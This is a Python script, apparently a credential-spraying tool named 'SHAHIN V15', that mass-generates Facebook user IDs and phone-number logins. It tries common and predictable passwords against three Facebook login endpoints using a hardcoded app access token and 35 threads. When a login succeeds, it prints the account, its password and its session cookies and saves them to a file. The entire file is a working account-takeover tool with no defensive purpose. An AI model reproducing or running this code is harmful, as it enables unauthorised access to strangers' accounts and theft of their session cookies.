import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Colors
A = '\033[1;97m' 
R = '\033[1;91m' 
G = '\033[1;92m' 
Y = '\033[1;93m' 
S = '\033[1;96m' 

loop, oks, cps = 0, [], []

def line():
    print(f'{S}╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸{A}')

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V15{A}''')
    line()
    print(f' {A}[{G}•{A}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {A}[{G}•{A}] TYPE     : {Y}UID LOGIN (OLD ID SPECIAL)')
    line()

def Main():
    logo()
    print(f' {G}[1]{A} METHOD M-BASIC {G}(BEST FOR OLD)')
    print(f' {G}[2]{A} METHOD GRAPH   {S}(BEST FOR SPEED)')
    print(f' {G}[3]{A} METHOD MOBILE  {Y}(NEW UPDATE)')
    print(f' {G}[0]{A} EXIT')
    line()
    m_opt = input(f' {A}[{G}•{A}] SELECT METHOD : {G}')
    
    logo()
    print(f' {G}[1]{A} OLD ID CLONE {Y}(2004-2010)')
    print(f' {G}[2]{A} BD RANDOM CLONE {S}(UID)')
    line()
    t_opt = input(f' {A}[{G}•{A}] SELECT TARGET : {G}')
    
    if t_opt == '1':
        prefix = random.choice(["10000", "100000"])
        limit = int(input(f' {A}[{G}+] LIMIT: {G}'))
        start_crack(prefix, limit, m_opt, is_old=True)
    else:
        code = input(f' {A}[{G}+] CODE (017/019): {G}')
        limit = int(input(f' {A}[{G}+] LIMIT: {G}'))
        start_crack(code, limit, m_opt, is_old=False)

def start_crack(target, limit, method, is_old):
    with ThreadPool(max_workers=35) as shahin:
        logo()
        print(f' {A}[{G}•{A}] METHOD: {method} | TOTAL: {limit}')
        line()
        for _ in range(limit):
            if is_old:
                uid = target + ''.join(random.choice(string.digits) for _ in range(6))
                pws = ['123456', '1234567', '12345678', 'password', '11223344', '572737']
            else:
                num = ''.join(random.choice(string.digits) for _ in range(8))
                uid = target + num
                pws = [uid, num, uid[:6], uid[:7], 'shahin123', 'shahin786']
            
            shahin.submit(engine_v15, uid, pws, method, limit)

def engine_v15(uid, pws, method, limit):
    global loop, oks, cps
    ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,124)}.0.0.0 Mobile Safari/537.36"
    
    for pw in pws:
        session = requests.Session()
        if method == '1': # MBASIC
            url = f'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
            data = {"lsd":random.randint(111,999),"jazoest":random.randint(111,999),"email":uid,"pass":pw}
        elif method == '2': # GRAPH
            url = 'https://b-graph.facebook.com/auth/login'
            data = {'email': uid, 'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json'}
        else: # MOBILE
            url = 'https://m.facebook.com/login.php'
            data = {"email":uid,"pass":pw}

        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded'}
        
        try:
            res = session.post(url, data=data, headers=headers).text
            if 'session_key' in res or 'c_user' in session.cookies.get_dict():
                coki = ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{A}')
                print(f' {Y}[COOKIE] {A}{coki}')
                line()
                oks.append(uid)
                open('SHAHIN-OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n')
                break
            elif 'checkpoint' in res:
                # print(f'\r\r{Y}[SHAHIN-CP] {uid} | {pw}{A}')
                cps.append(uid)
                break
        except: pass

    loop += 1
    sys.stdout.write(f'\r\r {A}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{A} CP:{Y}{len(cps)}{A} '); sys.stdout.flush()

if __name__ == "__main__":
    Main()
